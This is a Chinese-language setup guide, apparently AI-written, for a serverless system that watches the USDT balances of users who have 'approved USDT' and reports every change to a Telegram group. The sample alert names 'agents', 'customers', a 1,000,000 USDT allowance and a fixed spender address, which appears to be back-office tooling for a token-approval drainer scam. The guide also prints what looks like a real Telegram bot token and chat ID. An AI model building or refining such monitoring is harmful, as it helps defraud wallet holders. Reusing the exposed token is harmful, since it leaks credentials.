# 完整实施方案：用户授权自动监控 USDT 动账通知

## 📋 目录

1. [系统架构](#系统架构)
2. [实施步骤](#实施步骤)
3. [配置说明](#配置说明)
4. [测试验证](#测试验证)
5. [常见问题](#常见问题)

---

## 🏗️ 系统架构

### 核心流程

```
┌─────────────────┐
│  用户前端授权    │
│  (approve USDT) │
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────────┐
│  POST /api/user/authorize           │
│  ✓ 更新 nh_member_new (approved=1) │
│  ✓ 添加到 wallet_monitor           │
│  ✓ 添加到 Moralis Stream           │
│  ✓ 发送授权通知                    │
└────────┬────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│  Moralis Stream 监听链上交易        │
│  • 监听 USDT Transfer 事件         │
│  • 只监听 wallet_monitor 中的地址  │
└────────┬────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│  Webhook: /api/moralis/webhook      │
│  • 解析 USDT Transfer 事件         │
│  • 写入 wallet_transactions 表     │
└────────┬────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│  数据库触发器自动执行                │
│  • 插入 telegram_notification_queue│
└────────┬────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│  Edge Function: telegram-notifier   │
│  • 查询链上 USDT 余额              │
│  • 获取用户代理信息                │
│  • 发送 Telegram 群组通知          │
└─────────────────────────────────────┘
```

### 技术优势

- ✅ **零服务器成本** - 完全 Serverless
- ⚡ **实时推送** - Moralis 主动推送，延迟 < 5 秒
- 🎯 **精准监听** - 只监听已授权用户地址
- 🔒 **高可用性** - 无需维护服务器

---

## 🚀 实施步骤

### 步骤 1：环境变量配置 ✅

已在 `.env.local` 中添加必要配置：

```env
# Telegram 配置
TELEGRAM_BOT_TOKEN="8244139410:AAECUajPMdPx4C6b64YO0Wu2ginswejST_I"
TELEGRAM_CHAT_ID="-1003149735777"

# Moralis 配置
MORALIS_API_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 应用 URL
NEXT_PUBLIC_APP_URL="https://ethmax.vercel.app"
```

⚠️ **重要**：如果你的域名不是 `ethmax.vercel.app`，请修改 `NEXT_PUBLIC_APP_URL`！

### 步骤 2：配置 Moralis Stream

#### 2.1 登录 Moralis Dashboard

访问：https://admin.moralis.io/streams

#### 2.2 创建新 Stream

点击 **"+ New Stream"** 或 **"Create Stream"**

#### 2.3 基本配置

| 字段 | 值 |
|------|------|
| **Stream Name** | ETH USDT Monitor |
| **Description** | 监听授权用户的 USDT 转账 |
| **Blockchain** | Ethereum Mainnet |
| **Stream Type** | Contract Events |

#### 2.4 Webhook 配置

| 字段 | 值 |
|------|------|
| **Webhook URL** | `https://你的域名/api/moralis/webhook` |
| **Tag** | `eth-usdt-monitor` |

⚠️ **关键**：Webhook URL 必须是你的实际域名！

常见域名格式：
- `https://项目名.vercel.app`
- `https://项目名-用户名.vercel.app`
- 或你的自定义域名

#### 2.5 合约配置

**Contract Address**（USDT 合约）:
```
0xdAC17F958D2ee523a2206206994597C13D831ec7
```

**ABI** (粘贴以下 JSON):
```json
[
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "name": "from", "type": "address" },
      { "indexed": true, "name": "to", "type": "address" },
      { "indexed": false, "name": "value", "type": "uint256" }
    ],
    "name": "Transfer",
    "type": "event"
  }
]
```

**Topic Filter**:
- Topic0: `Transfer(address,address,uint256)`

#### 2.6 高级设置

| 字段 | 值 |
|------|------|
| **Confirmations Required** | 1-3（推荐 1，最快） |
| **Include Internal Txs** | 否 |
| **Include Native Txs** | 否 |
| **Include Contract Logs** | 是 ✓ |

#### 2.7 保存并激活

点击 **"Save"** 或 **"Activate"**

### 步骤 3：部署到 Vercel（或重新部署）

如果环境变量已更新，需要重新部署：

```bash
# 方式 1：通过 Vercel Dashboard
# 1. 访问 https://vercel.com
# 2. 找到项目
# 3. 点击 "Redeploy"

# 方式 2：通过 Git Push
git add .
git commit -m "配置 Telegram 和 Moralis 环境变量"
git push
```

### 步骤 4：配置 Supabase Edge Function

#### 4.1 部署 Edge Function

```bash
# 进入 Supabase CLI
cd supabase

# 部署 telegram-notifier 函数
supabase functions deploy telegram-notifier
```

#### 4.2 配置数据库触发器

在 Supabase SQL Editor 中执行：

```sql
-- 创建触发器：当 wallet_transactions 插入新记录时，自动创建通知
CREATE OR REPLACE FUNCTION trigger_wallet_transaction_notification()
RETURNS TRIGGER AS $$
DECLARE
  user_id_value TEXT;
BEGIN
  -- 从 nh_member_new 获取用户 ID
  SELECT id INTO user_id_value
  FROM nh_member_new
  WHERE wallet_address = NEW.user_address
  LIMIT 1;

  -- 插入通知队列
  IF user_id_value IS NOT NULL THEN
    INSERT INTO telegram_notification_queue (
      user_id,
      notification_type,
      notification_data,
      is_sent,
      created_at
    ) VALUES (
      user_id_value,
      'wallet_transaction',
      jsonb_build_object(
        'user_address', NEW.user_address,
        'transaction_type', NEW.transaction_type,
        'amount', NEW.amount,
        'token', NEW.token,
        'tx_hash', NEW.tx_hash,
        'block_number', NEW.block_number,
        'timestamp', NEW.timestamp
      ),
      false,
      NOW()
    );
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- 删除旧触发器（如果存在）
DROP TRIGGER IF EXISTS on_wallet_transaction_insert ON wallet_transactions;

-- 创建触发器
CREATE TRIGGER on_wallet_transaction_insert
  AFTER INSERT ON wallet_transactions
  FOR EACH ROW
  EXECUTE FUNCTION trigger_wallet_transaction_notification();
```

---

## ⚙️ 配置说明

### Telegram 配置

#### 获取 Bot Token

1. 打开 Telegram，搜索 `@BotFather`
2. 发送 `/newbot` 创建机器人
3. 按提示设置名称
4. 复制获得的 Token

#### 获取 Chat ID

1. 创建 Telegram 群组
2. 将机器人添加到群组
3. 发送任意消息
4. 访问：`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
5. 找到 `"chat":{"id":-100xxxxx}` 中的 ID

### Moralis 配置

#### 获取 API Key

1. 访问：https://admin.moralis.io/settings/api-keys
2. 复制 API Key
3. 添加到 `.env.local` 中

### 域名配置

#### Vercel 默认域名

访问 Vercel Dashboard → 项目 → Settings → Domains

格式通常为：
- `https://项目名.vercel.app`
- `https://项目名-团队名.vercel.app`

#### 自定义域名

如果配置了自定义域名，使用自定义域名。

---

## 🧪 测试验证

### 测试 1：授权流程测试

1. **前端授权**
   ```
   用户连接钱包 → 点击授权按钮 → 确认交易
   ```

2. **检查数据库**
   - 打开 Supabase → Table Editor → `nh_member_new`
   - 确认 `approved = 1`
   - 查看 `first_approved_at` 时间戳

3. **检查监听表**
   - 打开 Supabase → Table Editor → `wallet_monitor`
   - 确认地址已添加
   - `is_active = true`, `monitor_transactions = true`

4. **检查 Telegram 通知**
   - 查看 Telegram 群组
   - 应该收到授权通知消息

### 测试 2：Moralis Stream 测试

#### 方法 1：Moralis Dashboard 测试

1. 访问 https://admin.moralis.io/streams
2. 找到你的 Stream
3. 点击 **"Test Stream"**
4. 查看 Vercel Logs → Functions → `/api/moralis/webhook`
5. 确认收到 POST 请求

#### 方法 2：真实交易测试

1. **发起小额 USDT 转账**
   ```
   从任意地址 → 向已授权用户地址转账 1 USDT
   ```

2. **等待确认**
   - 1 个确认：约 15 秒
   - 3 个确认：约 45 秒

3. **检查通知**
   - 查看 Telegram 群组
   - 应该收到 USDT 转账通知

### 测试 3：通知内容验证

Telegram 通知应包含以下信息：

```
钱包余额: 1.234567 USDT
顶层代理: XXX代理
代理昵称: agent123
用户编号: 123456
用户备注: 备注信息
是否活动: 是
用户钱包: 
0xAbCdEf1234567890...
授权金额: 1000000 USDT
客户地址: 
0xabcdef1234567890...
授权对象: 
0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
执行操作: 客户USDT余额增加/减少
交易哈希: 0x123abc...
```

---

## 🐛 常见问题

### Q1: 授权成功但没收到通知

**可能原因：**
1. Telegram 配置错误
2. Edge Function 未部署
3. 数据库触发器未创建

**解决方法：**
```bash
# 1. 检查环境变量
echo $TELEGRAM_BOT_TOKEN
echo $TELEGRAM_CHAT_ID

# 2. 重新部署 Edge Function
supabase functions deploy telegram-notifier

# 3. 检查数据库触发器
# 在 Supabase SQL Editor 中运行：
SELECT * FROM pg_trigger WHERE tgname LIKE '%wallet%';
```

### Q2: Moralis Webhook 未收到事件

**可能原因：**
1. Webhook URL 错误
2. Stream 未激活
3. 地址未添加到 Stream

**解决方法：**
1. 在 Moralis Dashboard 点击 "Test Stream"
2. 检查 Vercel Logs
3. 确认 Webhook URL 正确

### Q3: 真实交易无通知，测试交易有通知

**原因：**
- Moralis Stream 未配置或配置错误
- 测试交易直接写数据库，绕过了 Moralis

**解决方法：**
- 按照 [步骤 2](#步骤-2配置-moralis-stream) 重新配置 Moralis Stream
- 使用 "Test Stream" 验证配置

### Q4: 需要云服务器吗？

**答案：不需要！**

本方案完全基于 Serverless 架构：
- Next.js API Routes (Vercel)
- Supabase Edge Functions
- Moralis Stream

唯一需要云服务器的情况：
- 你想使用 `telegram-bot/index.js`（轮询方式）
- **但不推荐！** 因为：
  - 每月服务器费用
  - 轮询延迟更高
  - RPC 调用限制

### Q5: 如何添加更多监听地址？

**自动添加：**
- 用户授权成功时，系统自动添加

**手动添加：**
```bash
# 运行脚本
node scripts/add-address-to-monitor.js 0xYourAddress
```

**批量添加：**
- 在 Moralis Dashboard → Stream → Add Addresses

---

## 📊 监控与维护

### 日常检查

1. **Vercel Dashboard**
   - Functions → 检查 `/api/moralis/webhook` 调用次数
   - Logs → 查看错误日志

2. **Supabase Dashboard**
   - Table Editor → `telegram_notification_queue`
   - 检查 `is_sent = false` 的记录（未发送）

3. **Moralis Dashboard**
   - Streams → 检查 Stream 状态
   - Webhooks → 查看推送记录

### 性能优化

1. **Moralis Stream**
   - 只添加需要监听的地址
   - 不要监听所有 USDT 交易

2. **数据库**
   - 定期清理旧的 `wallet_transactions` 记录
   - 清理已发送的 `telegram_notification_queue`

3. **Telegram 通知**
   - 避免短时间内大量通知
   - 可以添加防抖逻辑

---

## ✅ 实施清单

- [x] 配置 `.env.local` 环境变量
- [ ] 配置 Moralis Stream
  - [ ] 创建 Stream
  - [ ] 配置 Webhook URL
  - [ ] 配置 USDT 合约和 ABI
  - [ ] 测试 Stream
- [ ] 部署到 Vercel
  - [ ] 推送代码
  - [ ] 检查环境变量
  - [ ] 验证部署成功
- [ ] 配置 Supabase
  - [ ] 部署 Edge Function
  - [ ] 创建数据库触发器
- [ ] 测试验证
  - [ ] 测试授权流程
  - [ ] 测试 Moralis Webhook
  - [ ] 测试真实交易

---

## 🎉 总结

### 优势

1. **零服务器成本** - 完全 Serverless，无需云服务器
2. **真正实时** - Moralis 主动推送，延迟 < 5 秒
3. **自动化** - 用户授权即自动添加监听
4. **可扩展** - 支持无限数量地址监听
5. **高可用** - 利用 Vercel + Supabase + Moralis 高可用架构

### 关键点

- ✅ **环境变量配置正确**
- ✅ **Moralis Stream 配置正确**
- ✅ **Webhook URL 使用实际域名**
- ✅ **数据库触发器已创建**
- ✅ **Edge Function 已部署**

### 下一步

1. 完成 [实施清单](#实施清单)
2. 进行完整测试
3. 监控生产环境运行状态
4. 根据实际情况优化性能

---

**创建时间**: 2025-01-11  
**版本**: v1.0  
**作者**: AI 技术顾问

